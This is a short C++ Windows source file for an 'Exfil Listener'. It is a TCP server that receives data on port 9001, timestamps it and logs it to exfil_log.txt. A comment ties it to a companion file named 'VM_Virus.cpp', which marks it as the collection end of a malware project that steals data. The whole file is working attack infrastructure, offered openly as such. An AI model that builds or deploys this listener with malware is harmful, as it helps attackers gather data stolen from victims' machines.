#include <iostream>
#include <winsock2.h>
#include <fstream>
#include <ctime>
#pragma comment(lib, "ws2_32.lib")

using namespace std;

// ======================== CONFIGURATION ========================
// >>> REPLACE IF NEEDED <<<
const int EXFIL_PORT = 9001;  // Must match EXFIL_PORT in VM_Virus.cpp
// ===============================================================

int main() {
    WSADATA wsa;
    SOCKET listenSock, clientSock;
    struct sockaddr_in server, client;
    char buffer[4096] = {0};

    WSAStartup(MAKEWORD(2, 2), &wsa);
    listenSock = socket(AF_INET, SOCK_STREAM, 0);

    server.sin_family = AF_INET;
    server.sin_addr.s_addr = INADDR_ANY;
    server.sin_port = htons(EXFIL_PORT);

    bind(listenSock, (struct sockaddr*)&server, sizeof(server));
    listen(listenSock, 5);

    cout << "[Exfil Listener] Waiting on port " << EXFIL_PORT << "..." << endl;

    while (true) {
        int c = sizeof(struct sockaddr_in);
        clientSock = accept(listenSock, (struct sockaddr*)&client, &c);
        if (clientSock == INVALID_SOCKET) continue;

        memset(buffer, 0, sizeof(buffer));
        int bytes = recv(clientSock, buffer, sizeof(buffer), 0);
        if (bytes > 0) {
            // Timestamp and save exfiltrated data
            time_t now = time(0);
            char* dt = ctime(&now);
            dt[strlen(dt) - 1] = 0;

            cout << "\n[" << dt << "] Data received:" << endl;
            cout << string(buffer, bytes) << endl;
            cout << string(50, '-') << endl;

            // Also log to file
            ofstream log("exfil_log.txt", ios::app);
            log << "[" << dt << "]\n" << string(buffer, bytes) << "\n\n";
            log.close();
        }
        closesocket(clientSock);
    }

    closesocket(listenSock);
    WSACleanup();
    return 0;
}